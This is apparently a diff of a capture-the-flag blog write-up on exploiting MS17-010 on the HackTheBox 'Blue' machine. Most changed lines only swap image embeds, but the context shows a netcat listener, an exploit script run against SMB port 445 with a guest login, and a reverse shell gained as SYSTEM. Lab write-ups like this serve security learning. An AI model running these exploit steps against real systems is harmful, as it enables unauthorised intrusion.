@@ -98,7 +98,8 @@ Using a script from this repo I can gather the information needed to verify whet
 Firstly, because the command python is pointed to python3 in the 2022.4 version of kali we much modify/add the shebang line at the top of each script we use to say `#!/usr/bin/python2`
 
 Now that this is fixed I am receiving the following error - 
-![[Pasted image 20221218141024.png]]
+
+{{< image src="/static/Pasted image 20221218141024.png" alt="Error1" position="center" style="border-radius: 8px;" >}}
 
 To fix this error I will clone impacket into the same working directory as the previous scripts `/htb/windows/blue/MS17-010` . This may vary depending on your workspace & how you have things setup in your environment.
 
@@ -129,7 +130,7 @@ python2 setup.py install
 ```
 
 Impacket has successfully installed however I am receiving another error.
-![[Pasted image 20221218142604.png]]
+{{< image src="/static/Pasted image 20221218142604.png" alt="Error2" position="center" style="border-radius: 8px;" >}}
 
 I must install this dependencies as well.
 
@@ -177,20 +178,20 @@ nc -lvnp 443
 ./send_and_execute.py $IP ../svc_host.exe 445 lsarpc
 ```
 
-![[Pasted image 20221218144853.png]]
+{{< image src="/static/Pasted image 20221218144853.png" alt="Error3" position="center" style="border-radius: 8px;" >}}
 
 Looks like an access denied error. I will try and edit the script and add `guest` to the username line, and leave the password blank.
 
-![[Pasted image 20221218145035.png]]
+{{< image src="/static/Pasted image 20221218145035.png" alt="script_edit" position="center" style="border-radius: 8px;" >}}
 
 Now I will rerun the script.
 
 It completed succesfully, and i now have a reverse shell.
 
-![[Pasted image 20221218145224.png]]
+{{< image src="/static/Pasted image 20221218145224.png" alt="revshell" position="center" style="border-radius: 8px;" >}}
 
 #### Post-Exploit - 
 
-![[Pasted image 20221218145359.png]]
+{{< image src="/static/Pasted image 20221218145359.png" alt="revshell" position="center" style="border-radius: 8px;" >}}
 
 I am `nt authority\system`. This machine is rooted and complete. The flags can be found on the Desktop's of the user & administrator! 
